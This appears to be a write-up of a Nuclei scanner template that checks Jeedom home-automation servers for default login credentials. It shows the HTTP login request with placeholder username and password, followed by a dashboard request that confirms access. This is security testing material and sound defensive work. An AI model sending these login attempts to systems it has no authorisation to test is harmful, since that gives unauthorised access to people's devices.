# Nuclei Template: Jeedom - Default Login
**Template ID:** jeedom-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`jeedom-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Jeedom default login has been detected.

## Steps to reproduce / Exploit Payload
```http
POST /core/ajax/user.ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

action=login&username={{username}}&password={{password}}&twoFactorCode=&storeConnection=0

GET /index.php?v=d&p=dashboard HTTP/1.1
Host: {{Hostname}}
```

